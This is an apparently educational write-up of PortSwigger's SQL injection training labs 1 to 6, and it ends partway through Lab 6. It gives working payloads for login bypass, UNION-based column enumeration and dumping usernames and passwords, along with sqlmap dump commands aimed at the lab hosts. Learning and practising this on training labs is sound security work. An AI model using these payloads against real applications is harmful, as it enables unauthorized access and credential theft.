---
title: Web Security Academy | SQL Injection
description: Writeup of PortSwigger's SQL Injection Labs
date: 2023-03-02 12:00:00 -500
categories: [Web Exploitation, Portswigger, SQL Injection]
tags: [Web Exploitation, SQL Injection, Python3, sqlmap, Burp Suite, UNION-based SQL Injection]
pin: true
math: true
mermaid: true
image:
  path: /assets/img/portswigger-sqli/img.png
---

# **<strong><font color="Brown">Lab-1</font></strong>**
***
## **<strong><font color="DarkCyan">About</font></strong>**

This <a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data" target="_blank"><er>Lab</er></a> contains a <a href="https://portswigger.net/web-security/sql-injection" target="_blank"><er>SQL injection </er></a>vulnerability in the product category filter. <br/>
To solve the lab, we need to perform a SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.

## **<strong><font color="DarkCyan">Detection</font></strong>**
* Submit a single quotation mark ```'``` in ```/filter?category=Gifts``` to break out the original SQL query quotation marks and cause an error
* The resulting query sent by the App to the back-end database:
```sql
SELECT * FROM products WHERE category = 'Gifts'' AND released = 1
```
* The App returns a ```500 Internal Server Error``` response, which means that an error has occured in the back-end while processing the query.
* The ```category``` parameter is vulnerable to SQL injection.

## **<strong><font color="DarkCyan">Exploitation</font></strong>**
### **<strong><font color="MediumPurple">Manual</font></strong>**

1. Intercept the request with Burp Suite proxy
2. Send the request to repeater
3. Inject the ```category``` parameter with the following payload: ``` ' OR 1=1 --``` 
4. The resulting SQL query sent by the App to the backend database: 
```sql
SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1
```
which is
```sql
SELECT * FROM products WHERE category = '' OR 1=1
```
> **📍 Note:** The following payload ```' OR 'a'='a``` is also valid and achieves the same result as the 1=1 attack to return all products, regardless of whether they have been released.
```sql
SELECT * FROM products WHERE category = '' OR 'a'='a' AND released = 1 
```

<div><video controls src="https://github.com/YounesTasra-R4z3rSw0rd/YounesTasra.github.io_Img/blob/main/SQLi_Lab1.mp4?raw=true" muted="false" width="800" height="500"></video></div>

### **<strong><font color="MediumPurple">Automated</font></strong>**
* You can find the source code <a href="https://github.com/YounesTasra-R4z3rSw0rd/Web-Security-Academy/blob/main/SQL%20Injection/Lab%231/Lab-1.py" target="_blank"><er>here</er></a>

* <a href="https://github.com/YounesTasra-R4z3rSw0rd/Web-Security-Academy/blob/main/SQL%20Injection/Lab%231/requirements.txt" target="_blank"><er>Requirements</er></a>:
```console
$ pip3 install -r requirements.txt
```

* Help Menu:

```console
$ python3 Lab-1.py --help
usage: Lab-1.py [-h] -u URL [-n]

Usage Example: python3 Lab-1.py --url https://0a2100.web-security-academy.net/ --no-proxy

options:
  -h, --help         show this help message and exit
  -u URL, --url URL  Enter the Lab URL
  -n, --no-proxy     Do not use proxy                               
```

![Lab#1](https://user-images.githubusercontent.com/101610095/219432009-faf5cc9a-1828-47fc-8f9d-07eaa67ebb20.gif)

# **<strong><font color="Brown">Lab-2</font></strong>**
***
## **<strong><font color="DarkCyan">About</font></strong>**

This <a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data" target="_blank"><er>Lab</er></a> contains a <a href="https://portswigger.net/web-security/sql-injection" target="_blank"><er>SQL injection </er></a>vulnerability in the login functionality. <br/>
To solve the lab, we need to perform a SQL injection attack that logs in to the application as the administrator user.

## **<strong><font color="DarkCyan">Detection</font></strong>**
***
* Navigate to the ```/login``` directory and you will be presented with the vulnerable login functionality<br/>
* Since we know that this login form is vulnerable to SQLi, let's try triggering an error by submitting a single quote ```'``` in the ```username``` field and some random password in the password field.
* The App should return a ```500 Internal Server Error```, which means that an error has occured in the back-end database while processing the query.
* The ```username``` POST parameter is vulnerable to SQL Injection !

## **<strong><font color="DarkCyan">Exploitation</font></strong>**
***
### **<strong><font color="MediumPurple">Manual</font></strong>**
1. Intercept the request with Burp Suite proxy,
2. Send the request to repeater,
3. Inject the username field with the following payload: ```administrator'--```
4. The resulting query sent by the App to the back-end database should look to something like this:
```sql
SELECT * FROM content WHERE username='administrator'--' AND password='p@$$w0rd'
```
which is
```sql
SELECT * FROM content WHERE username='administrator'
```
> **📍 Note:** You can also try the following payload ```randomusername' OR 1=1--``` which is also valid and bypasses the login functionality
```sql
SELECT * FROM content WHERE username='randomusername' OR 1=1--' AND password='p@$$w0rd'
```

<div><video controls src="https://github.com/YounesTasra-R4z3rSw0rd/YounesTasra.github.io_Img/blob/main/SQLi_Lab2.mp4?raw=true" muted="false" width="800" height="500"></video></div>

### **<strong><font color="MediumPurple">Automated</font></strong>**
* You can find the source code <a href="https://github.com/YounesTasra-R4z3rSw0rd/Web-Security-Academy/blob/main/SQL%20Injection/Lab%232/Lab-2.py" target="_blank"><er>here</er></a>

* <a href="https://github.com/YounesTasra-R4z3rSw0rd/Web-Security-Academy/blob/main/SQL%20Injection/Lab%232/requirements.txt" target="_blank"><er>Requirements</er></a>:
```console
$ pip3 install -r requirements.txt
```
* Help Menu:

```console
$ python3 Lab-2.py --help
usage: Lab-2.py [-h] -u URL [-n]

Usage Example: python3 Lab-2.py --url https://0a2100.web-security-academy.net/ --no-proxy

options:
  -h, --help         show this help message and exit
  -u URL, --url URL  Enter the Lab URL
  -n, --no-proxy     Do not use proxy                               
```
![Lab#2](https://user-images.githubusercontent.com/101610095/219528976-629965c4-3648-4969-846f-6b7376088356.gif)

# **<strong><font color="Brown">Lab-3</font></strong>**
***
## **<strong><font color="DarkCyan">About</font></strong>**

This <a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data" target="_blank"><er>Lab</er></a> contains a <a href="https://portswigger.net/web-security/sql-injection" target="_blank"><er>SQL injection </er></a>vulnerability in the product category filter. <br/>
The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query.

## **<strong><font color="DarkCyan">End Goal</font></strong>**
***
* To solve the lab, we need to determine the number of columns returned by the query by performing a <a href="https://portswigger.net/web-security/sql-injection/union-attacks" target="_blank"><er>SQL injection UNION attack</er></a>

## **<strong><font color="DarkCyan">Detection</font></strong>**
***
* Submit a single quotation mark ```'``` in ```/filter?category=Gifts``` to break out the original SQL query quotation marks and cause an internal error,
* The resulting query sent by the App to the back-end databases should look to something like:
```SQL
SELECT * FROM products WHERE category = 'Gifts''
```
* The App should return a ```500 Internal Server Error```, which means that an error has occured in the back-end database while processing the query.
* The ```category``` parameter is vulnerable to SQL injection.

## **<strong><font color="DarkCyan">Exploitation</font></strong>**
***
### **<strong><font color="MediumPurple">Manual</font></strong>**

The goal of this lab is to figure out the number of columns returned by the query by perfoming a SQL Injection UNION attack. To do so, we will incrementally inject a series of ```UNION SELECT``` payloads specifiying different number of ```NULL``` values until we no longer get an ```Internal Server Error```. 
1. Intercept the request with Burp Suite proxy
2. Send the request to repeater
3. Start by injecting the ```category``` parameter with ```Gifts'+UNION+SELECT+NULL--``` which will return an error
4. And then ```'UNION+SELECT+NULL,NULL--``` which will also return an error
5. And finally ```'UNION+SELECT+NULL,NULL,NULL--``` which will output the results of the original query <br/>
```SELECT * FROM products WHERE category = 'Gifts'```

> ***The number of columns is then ```3```***

<div><video controls src="https://github.com/YounesTasra-R4z3rSw0rd/YounesTasra.github.io_Img/blob/main/SQLi_Lab3.mp4?raw=true" muted="false" width="800" height="500"></video></div>

### **<strong><font color="MediumPurple">Automated</font></strong>**

* You can find the source code <a href="https://github.com/YounesTasra-R4z3rSw0rd/Web-Security-Academy/blob/main/SQL%20Injection/Lab%233/Lab-3.py" target="_blank"><er>here</er></a>

* <a href="https://github.com/YounesTasra-R4z3rSw0rd/Web-Security-Academy/blob/main/SQL%20Injection/Lab%233/requirements.txt" target="_blank"><er>Requirements</er></a>:
```console
$ pip3 install -r requirements.txt
```
* Help Menu:

```console
$ python3 Lab-3.py --help
usage: Lab-3.py [-h] -u URL [-n]

Usage Example: python3 Lab-3.py --url https://0a2100.web-security-academy.net/ --no-proxy

options:
  -h, --help         show this help message and exit
  -u URL, --url URL  Enter the Lab URL
  -n, --no-proxy     Do not use proxy                               
```
![Lab-3](https://user-images.githubusercontent.com/101610095/219708668-86145e6f-29e2-4396-99bc-bece5b6fc98e.gif)

# **<strong><font color="Brown">Lab-4</font></strong>**
***
## **<strong><font color="DarkCyan">About</font></strong>**

This <a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data" target="_blank"><er>Lab</er></a> contains a <a href="https://portswigger.net/web-security/sql-injection" target="_blank"><er>SQL injection </er></a> vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.<br/>

## **<strong><font color="DarkCyan">End Goal</font></strong>**
***
* Finding a column containing text by performing a <a href="https://portswigger.net/web-security/sql-injection/union-attacks" target="_blank"><er>SQL injection UNION attack</er></a>


## **<strong><font color="DarkCyan">Detection</font></strong>**
***
* Submit a single quotation mark ```'``` in ```/filter?category=Gifts``` to break out the original SQL query quotation marks and cause an internal error,
* The resulting query sent by the App to the back-end databases should look to something like:
```SQL
SELECT * FROM products WHERE category = 'Gifts''
```
* The App should return a ```500 Internal Server Error```, which means that an error has occured in the back-end database while processing the query.
* The ```category``` parameter is vulnerable to SQL injection.

## **<strong><font color="DarkCyan">Exploitation</font></strong>**
***
### **<strong><font color="MediumPurple">Manual</font></strong>**

The goal of this lab is to figure out the number of columns returned by the query and then probing each column to test whether it can hold a specific string data, provided in the Lab.<br/>
To do so, we will incrementally submit a series of ```UNION SELECT``` payloads that place the string value into each column in turn until we no longer get an ```Internal Server Error```. 

**📍 Determining the number of columns:**
1. Intercept the request with Burp Suite proxy,
2. Send the request to repeater,
3. Start by injecting the ```category``` parameter with ```Gifts'+UNION+SELECT+NULL--``` which will return an error
4. And then ```'UNION+SELECT+NULL,NULL--``` which will also return an error
5. And finally ```'UNION+SELECT+NULL,NULL,NULL--``` which will output the results of the original query <br/>
```SELECT * FROM products WHERE category = 'Gifts'```
> ***The number of columns is then ```3```***

**📍 Finding columns containing text:**
1. Copy the string provided in the Lab:
![String Data](https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/Web-Security-Academy/main/SQL%20Injection/Lab%234/2023-02-17%2018_14_48-SQL%20injection%20UNION%20attack%2C%20finding%20a%20column%20containing%20text%20%E2%80%94%20Mozilla%20Firefox.png)
> In this case, the string data is: ```VnoDqj```
2. Start by injecting the ```category``` parameter ```Gifts'+UNION+SELECT+'VnoDqj',NULL,NULL--``` which will return an error. This means that the first column is not a string
3. And then ```Gifts'+UNION+SELECT+NULL,'VnoDqj',NULL--``` which will output the results of the original query and make the database print out ```VnoDqj```. This means that the second column is a string.
4. And finally ```Gifts'+UNION+SELECT+NULL,NULL,'VnoDqj'--``` which will also return an error

> The ```second column``` contains string data.

<div><video controls src="https://github.com/YounesTasra-R4z3rSw0rd/YounesTasra.github.io_Img/blob/main/SQLi_Lab4.mp4?raw=true" muted="false" width="800" height="500"></video></div>

### **<strong><font color="MediumPurple">Automated</font></strong>**

* You can find the source code <a href="https://github.com/YounesTasra-R4z3rSw0rd/Web-Security-Academy/blob/main/SQL%20Injection/Lab%234/Lab-4.py" target="_blank"><er>here</er></a>

* <a href="https://github.com/YounesTasra-R4z3rSw0rd/Web-Security-Academy/blob/main/SQL%20Injection/Lab%234/requirements.txt" target="_blank"><er>Requirements</er></a>:
```console
$ pip3 install -r requirements.txt
```
* Help Menu:

```console
$ python3 Lab-4.py --help
usage: Lab-4.py [-h] -u URL [-n]

Usage Example: python3 Lab-4.py --url https://0a2100.web-security-academy.net/ --no-proxy

options:
  -h, --help         show this help message and exit
  -u URL, --url URL  Enter the Lab URL
  -n, --no-proxy     Do not use proxy                               
```
![Lab-4](https://user-images.githubusercontent.com/101610095/220033508-30d31320-3651-4b64-ac7b-fca9ccee1b39.gif)


# **<strong><font color="Brown">Lab-5</font></strong>**
***
## **<strong><font color="DarkCyan">About</font></strong>**

This <a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data" target="_blank"><er>Lab</er></a> contains a <a href="https://portswigger.net/web-security/sql-injection" target="_blank"><er>SQL injection </er></a> vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.<br/>
The database contains a different table called ```users```, with columns called ```username``` and ```password```. <br/>
To solve the Lab, perform a <a href="https://portswigger.net/web-security/sql-injection/union-attacks" target="_blank"><er>SQL injection UNION attack</er></a> to retrieve all usernames and passwords.

## **<strong><font color="DarkCyan">End Goal</font></strong>**
***
Log in as the ```administrator``` user.


## **<strong><font color="DarkCyan">Detection</font></strong>**
***
* Submit a single quotation mark ```'``` in ```/filter?category=Gifts``` to break out the original SQL query quotation marks and cause an internal error
* The resulting query sent by the App to the back-end databases should look to something like:
```sql
SELECT * FROM products WHERE category = 'Gifts''
```
* The App should return a ```500 Internal Server Error```, which means that an error has occured in the back-end database while processing the query.
* The ```category``` parameter is vulnerable to SQL injection.

## **<strong><font color="DarkCyan">Exploitation</font></strong>**
***
### **<strong><font color="MediumPurple">Manual</font></strong>**

> 📝: **HACK STEPS:** <br/>
> 1° Determine the number of columns that are being returned by the original query <br/>
> 2° Determine the columns that contains string data <br/>
> 3° Retrieve the database version <br/>
> 4° Retrieve the current database name <br/>
> 5° Fetch database (schema) names <br/>
> 6° Fetch the tables for the current database <br/>
> 7° Fetch the columns for a specific table in the current database <br/>
> 8° Dump data. <br/>

**📍 Number of columns:**
1. Intercept the request with Burp Suite proxy,
2. Send the request to repeater,
3. Start by injecting the ```category``` parameter with ```Gifts'+UNION+SELECT+NULL--``` which will return an error
4. And then ```Gifts'UNION+SELECT+NULL,NULL--``` which will return the results of the original query (Selecting content for product ```Gifts```) <br/>

> ☑️ ***The number of columns is ```2```***

**📍 Columns containing text:**
1. Inject the ```category``` parameter with the following payload ```'+UNION+SELECT+'a',NULL--``` <br/>
      => If an ```Internal Server Error``` occurs, then the first column does not contain string type data.
2. And then, inject the vulnerable parameter with ```'+UNION+SELECT+NULL,'a'--``` <br/>
      => If an ```Internal Server Error``` is returned, then the second column does not contain string type data.

> ☑️ ***In this Lab, both columns contain text.*** 

**📍 Database version:** <br/>
Each ```DBMS``` (Database Management System) has its own syntax to retrieve the version, and since we don't know which one we are dealing with, let's try the most popular ones.
Here is a great <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank"><er>Cheat-Sheet</er></a> you can refer to when exploiting UNION-based SQL injection:<br/>

**📜 Cheat-Sheet:** <br/>
1. Oracle: <br/>
```sql
SELECT banner FROM v$version
```
```sql
SELECT version FROM v$instance
```
2. Microsoft & MySQL: <br/>
```sql
SELECT @@version
```
3. PostgreSQL <br/>
```sql
SELECT version()
```
> In this Lab, the back-end DBMS is ```PostgreSQL```<br/>

* Let's retrieve the database version, by sending the following payload: ```'+UNION+SELECT+NULL,version()--```
<figure><center><img src="https://user-images.githubusercontent.com/101610095/220288617-b05e864a-2e5f-454e-9bf7-8c129bbd5de4.png" width="738" height="423" alt=""></center><center><em><figcaption>Database version</figcaption></em></center></figure>

**📍 Current database name:**

* Retrieving the current database name syntax for ```PostgreSQL``` DBMS: 
```sql
SELECT current_database()
```
* Inject the vulnerable parameter with the following payload: ```'+UNION+SELECT+NULL,current_database()--```
<figure><center><img src="https://user-images.githubusercontent.com/101610095/220291423-76f2c3a0-aaf9-4a32-8b51-b92e3a3ab821.png" width="738" height="423" alt=""></center><center><em><figcaption>Current Database Name</figcaption></em></center></figure>

> ☑️ ***The currrent database's name is: academy_labs*** 

**📍 Database names:**

* Retrieving databases names syntax for ```PostgreSQL``` DBMS: 
```sql
SELECT datname FROM pg_database
```
* Inject the vulnerable parameter with the following payload:```'+UNION+SELECT+NULL,datname+FROM+pg_database--```
<figure><center><img src="https://user-images.githubusercontent.com/101610095/220293746-3d8f24d7-c8d7-431d-b929-373cc9976154.png" width="738" height="423" alt=""></center><center><em><figcaption>Databases Names</figcaption></em></center></figure>

**📍 Fetching the tables for the current database:**
* Listing tables syntax for ```PostgreSQL``` DBMS: 
```sql
SELECT table_name FROM information_schema.tables
```

* Inject the vulnerable parameter with the following payload: ```'+UNION+SELECT+NULL,table_name+FROM+information_schema.tables--```
<figure><center><img src="https://user-images.githubusercontent.com/101610095/220296661-edb318ff-5ac2-49c6-824a-9c2cd2d7187b.png" width="738" height="423" alt=""></center><center><em><figcaption>Tables</figcaption></em></center></figure>

* This payload will return all the tables in the current database, and since we know the name of the table is ```users```, let's add a filter to our payload using the ```LIKE``` clause:<br/>
* Payload: 
```sql
'+UNION+SELECT+NULL,table_name+FROM+information_schema.tables+WHERE+table_name+LIKE+'users'--
```

![users_table](https://user-images.githubusercontent.com/101610095/220298815-0b415f32-7c27-4ce1-941a-c4e23147fff6.png)

**📍 Fetching columns for the table users in the current database:**
* Listing columns syntax for ```PostgreSQL``` DBMS: 
```sql
SELECT column_name FROM information_schema.columns WHERE table_name='TableName'
```
* Inject the vulnerable parameter with the following payload: ```'+UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name='users'--```
<figure><center><img src="https://user-images.githubusercontent.com/101610095/220299713-b3e5ad20-5d70-4be1-a89d-f67746a8ec8e.png" width="738" height="423" alt=""></center><center><em><figcaption>Columns</figcaption></em></center></figure>

**📍 Dumping data from users table:**
* We can retrieve the content of ```users``` table by sending the following payload: ```'+UNION+SELECT+username,password+FROM+users--``` 
<figure><center><img src="https://user-images.githubusercontent.com/101610095/220300804-b80049a3-c05f-4310-8dd1-9e1deca52305.png" width="738" height="423" alt=""></center><center><em><figcaption>Content of users table</figcaption></em></center></figure>


**📍 Solving the lab:**
* Now that we have dumped the credentials, we can go to ```/login``` and login as the ```Administrator``` user and solve the lab !!
<figure><center><img src="https://user-images.githubusercontent.com/101610095/220303361-b14f6ed2-b4b9-432a-941c-24db7a428184.png" width="738" height="423" alt=""></center><center><em><figcaption>Logging in as Administrator</figcaption></em></center></figure>

* 📹  **The entire process can be see in the clip below :**

<div><video controls src="https://github.com/YounesTasra-R4z3rSw0rd/YounesTasra.github.io_Img/blob/main/SQLi_Lab5.mp4?raw=true" muted="false" width="800" height="500"></video></div>


### **<strong><font color="MediumPurple">Automated</font></strong>**
#### **<strong><font color="RosyBrown">SQLmap</font></strong>**
***

**📍 Fetching databases names:**

* <strong><font color="White">Command:</font></strong> 
```console
root@kali# sqlmap --proxy=http://127.0.0.1:8080 -u 'https://0aa8007d033d30a9c0f2d25500e700ca.web-security-academy.net/filter?category=*' -p category --technique=U --threads=5 --level=4 --risk=3 --dbs --batch
```
* <strong><font color="White">Options:</font></strong><br/> 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - -proxy=http://127.0.0.1:8080 : Using BurpSuite proxy for debugging purposes <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -u : Target URL <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -p : Testable parameter <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - -technique=U : SQL Injection technique to use. Here i'm using the UNION technique <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - -threads : Maximum number of concurrent HTTP requests (default 1) <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - -level : Level of test to perform (5 is MAX) <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - -risk : Risk of test to perform (3 is MAX) <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - -dbs : Enumerate databases (schema) names <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - -batch : Never ask for user input, use the default behavior <br/>

* <strong><font color="White">Execution:</font></strong>  
![SQLMap_1](https://user-images.githubusercontent.com/101610095/220312739-645d4223-81ca-4ef9-b413-977a79cdf9ce.png) <br/>
> 📝 ***Here the database ```public``` is the one we are interested in.***

**📍 Fetching tables for database: 'public'**
* <strong><font color="White">Command:</font></strong> 
```console
root@kali# sqlmap --proxy=http://127.0.0.1:8080 -u 'https://0aa8007d033d30a9c0f2d25500e700ca.web-security-academy.net/filter?category=*' -p category --technique=U --threads=5 --level=4 --risk=3 -D public --tables --batch
```
* <strong><font color="White">Options:</font></strong><br/> 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - -tables : Enumerating database tables <br/>

* <strong><font color="White">Execution:</font></strong>  
![sqlmap_2](https://user-images.githubusercontent.com/101610095/220314044-2082729c-fe77-4806-971b-f04bae465756.png)

**📍 Fetching columns for table 'users' in database 'public'**

* <strong><font color="White">Command:</font></strong>   
```console
root@kali# sqlmap --proxy=http://127.0.0.1:8080 -u 'https://0aa8007d033d30a9c0f2d25500e700ca.web-security-academy.net/filter?category=*' -p category --technique=U --threads=5 --level=4 --risk=3 -D public -T users --columns --batch
```
* <strong><font color="White">Options:</font></strong><br/> 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - -columns : Enumerating database table columns <br/>

* <strong><font color="White">Execution:</font></strong> 
![sqlmap_3](https://user-images.githubusercontent.com/101610095/220316231-52c2d7aa-01ea-40b5-8bdd-122f2ae322f9.png)

**📍 Dumping data from table 'users' in database 'public':**
* <strong><font color="White">Command:</font></strong>  
```console
root@kali# sqlmap --proxy=http://127.0.0.1:8080 -u 'https://0aa8007d033d30a9c0f2d25500e700ca.web-security-academy.net/filter?category=*' -p category --technique=U --threads=5 --level=4 --risk=3 -D public -T users --dump --batch 
```

* <strong><font color="White">Options:</font></strong><br/> 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - -dump : Dump database table entries <br/>

* <strong><font color="White">Execution:</font></strong> 
![sqlmap_4](https://user-images.githubusercontent.com/101610095/220315870-2a6abc2b-9898-4237-a738-b08f71fd3616.png)

#### **<strong><font color="RosyBrown">Python3</font></strong>**
***

* You can find the source code <a href="https://github.com/YounesTasra-R4z3rSw0rd/Web-Security-Academy/blob/main/SQL%20Injection/Lab%235/Lab-5.py" target="_blank"><er>here</er></a>

* <a href="https://github.com/YounesTasra-R4z3rSw0rd/Web-Security-Academy/blob/main/SQL%20Injection/Lab%235/requirements.txt" target="_blank"><er>Requirements</er></a>:

```console
$ pip3 install -r requirements.txt
```
* Help Menu:

```console
$ python3 Lab-5.py --help
usage: Lab-5.py [-h] -u URL [-n]

Usage Example: python3 Lab-5.py --url https://0a2100.web-security-academy.net/ --no-proxy

options:
  -h, --help         show this help message and exit
  -u URL, --url URL  Enter the Lab URL
  -n, --no-proxy     Do not use proxy                               
```
![Lab-5](https://user-images.githubusercontent.com/101610095/220834052-c54932eb-4486-4110-a5cb-08a4f19d349e.gif)

# **<strong><font color="Brown">Lab-6</font></strong>**
***
## **<strong><font color="DarkCyan">About</font></strong>**

This <a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data" target="_blank"><er>Lab</er></a> contains a <a href="https://portswigger.net/web-security/sql-injection" target="_blank"><er>SQL injection </er></a> vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.<br/>
The database contains a different table called ```users```, with columns called ```username``` and ```password```. <br/>
To solve the Lab, perform a <a href="https://portswigger.net/web-security/sql-injection/union-attacks" target="_blank"><er>SQL injection UNION attack</er></a> to retrieve all usernames and passwords.

## **<strong><font color="DarkCyan">End Goal</font></strong>**
***
Log in as the ```administrator``` user.


## **<strong><font color="DarkCyan">Detection</font></strong>**
***
* Submit a single quotation mark ```'``` in ```/filter?category=Gifts``` to break out the original SQL query quotation marks and cause an internal error
* The resulting query sent by the App to the back-end databases should look to something like:
```sql
SELECT * FROM products WHERE category = 'Gifts''
```
* The App should return a ```500 Internal Server Error```, which means that an error has occured in the back-end database while processing the query.
* The ```category``` parameter is vulnerable to SQL injection.

## **<strong><font color="DarkCyan">Exploitation</font></strong>**
***
### **<strong><font color="MediumPurple">Manual</font></strong>**

> 📝: **HACK STEPS:** <br/>
> 1° Determine the number of columns that are being returned by the original query <br/>
> 2° Determine the columns that contains string data <br/>
> 3° Retrive data from ```users``` tables

**📍 Number of columns:**
1. Intercept the request with Burp Suite proxy,
2. Send the request to repeater,
3. Start by injecting the ```category``` parameter with ```Gifts'+UNION+SELECT+NULL--``` which will return an error
4. And then ```Gifts'UNION+SELECT+NULL,NULL--``` which will return the results of the original query (Selecting content for product ```Gifts```) <br/>

> ☑️ ***The number of columns is ```2```***

**📍 Columns containing text:**
1. Inject the ```category``` parameter with the following payload ```'+UNION+SELECT+'a',NULL--``` <br/>
      => If an ```Internal Server Error``` occurs, then the first column does not contain string type data.
2. And then, inject the vulnerable parameter with ```'+UNION+SELECT+NULL,'a'--``` <br/>
      => If an ```Internal Server Error``` is returned, then the second column does not contain string type data.

> ☑️ ***In this Lab, the second column contains string data.*** 

**📍 Retrieving data:**

* Since we know that there is a table called ```users``` that has two columns ```username``` and ```password``` and that we only have one column that return string data which we can control to fetch entries for table ```users```, we can the ```CONCAT``` clause. <br/>
* For example, we can send the following payload: ```'+UNION+SELECT+NULL,CONCAT(username, ':', password)+FROM+users--```, which will return the usernames and passwords seperated with a colon ```:```
![2023-02-24 07_31_49-SQL injection UNION attack, retrieving multiple values in a single column — Mozi](https://user-images.githubusercontent.com/101610095/221108630-87b2756a-6108-4fb7-b74b-c128fc343b2c.png)

* We can also do some cool stuff with ```CONCAT``` like sending the following payload: 
```sql
'+UNION+SELECT+NULL,CONCAT('The password of ', username, ' is : ', password)+FROM+users--
``` 
![2023-02-24 07_34_40-SQL injection UNION attack, retrieving multiple values in a single column — Mozi](https://user-images.githubusercontent.com/101610095/221109005-61fb30cb-537c-465a-afae-3d72e9d8ba90.png)

* We can also use the ```||``` to concat the results, for example:
```sql
'+UNION+SELECT+NULL,username||':'||password+FROM+users--
```
![2023-02-24 07_31_49-SQL injection UNION attack, retrieving multiple values in a single column — Mozi](https://user-images.githubusercontent.com/101610095/221108630-87b2756a-6108-4fb7-b74b-c128fc343b2c.png)


**📍 Solving the lab:**
* Now that we have dumped the credentials, we can go to ```/login``` and login as the ```Administrator``` user and solve the lab !!
<figure><center><img src="https://user-images.githubusercontent.com/101610095/221110694-536b8bc1-c9de-4a38-8bd4-da3b75f997fd.png" width="738" height="423" alt=""></center><center><em><figcaption>Logged in as Administrator</figcaption></em></center></figure>

* 📹  **The entire process can be see in the clip below :**

<div><video controls src="https://github.com/YounesTasra-R4z3rSw0rd/YounesTasra.github.io_Img/blob/main/SQLi_Lab6.mp4?raw=true" muted="false" width="800" height="500"></video></div>


### **<strong><font color="MediumPurple">Automated</font></strong>**
#### **<strong><font color="RosyBrown">SQLmap</font></strong>**
***

**📍 Fetching databases names:**

* <strong><font color="White">Command:</font></strong> 
```console
root@kali# sqlmap --proxy=http://127.0.0.1:8080 -u 'https://0aa8007d033d30a9c0f2d25500e700ca.web-security-academy.net/filter?category=*' -p category --technique=U --threads=5 --level=4 --risk=3 --dbs --batch
```
* <strong><font color="White">Options:</font></strong><br/> 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - -proxy=http://127.0.0.1:8080 : Using BurpSuite proxy for debugging purposes <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -u : Target URL <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -p : Testable parameter <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - -technique=U : SQL Injection technique to use. Here i'm using the UNION technique <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - -threads : Maximum number of concurrent HTTP requests (default 1) <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - -level : Level of test to perform (5 is MAX) <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - -risk : Risk of test to perform (3 is MAX) <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - -dbs : Enumerate databases (schema) names <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - -batch : Never ask for user input, use the default behavior <br/>

* <strong><font color="White">Execution:</font></strong>  
![2023-02-24 08_00_33-HACKING_MACHINE - VMware Workstation 16 Player (Non-commercial use only)](https://user-images.githubusercontent.com/101610095/221113676-d7224171-9ec8-442d-b008-e663e506c820.png)<br/>

> 📝 ***Here the database ```public``` is the one we are interested in.***

**📍 Dumping data from table 'users' in database 'public'**
* <strong><font color="White">Command:</font></strong> 
```console
root@kali# sqlmap --proxy=http://127.0.0.1:8080 -u 'https://0aa8007d033d30a9c0f2d25500e700ca.web-security-academy.net/filter?category=*' -p category --technique=U --threads=5 --level=4 --risk=3 -D public -T users --dump --batch
```
* <strong><font color="White">Options:</font></strong><br/> 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - -dump : Dump database table entries <br/>

* <strong><font color="White">Execution:</font></strong>  
![2023-02-24 07_58_23-HACKING_MACHINE - VMware Workstation 16 Player (Non-commercial use only)](https://user-images.githubusercontent.com/101610095/221113993-b9113a42-353a-4d27-88a3-377850614303.png)

#### **<strong><font color="RosyBrown">Python3</font></strong>**
***

* You can find the source code <a href="https://github.com/YounesTasra-R4z3rSw0rd/Web-Security-Academy/blob/main/SQL%20Injection/Lab%236/Lab-6.py" target="_blank"><er>here</er></a>

* <a href="https://github.com/YounesTasra-R4z3rSw0rd/Web-Security-Academy/blob/main/SQL%20Injection/Lab%236/requirements.txt" target="_blank"><er>Requirements</er></a>:

```console
$ pip3 install -r requirements.txt
```
* Help Menu:

```console
$ python3 Lab-6.py --help
usage: Lab-6.py [-h] -u URL [-n]

Usage Example: python3 Lab-6.py --url https://0a2100.web-security-academy.net/ --no-proxy

options:
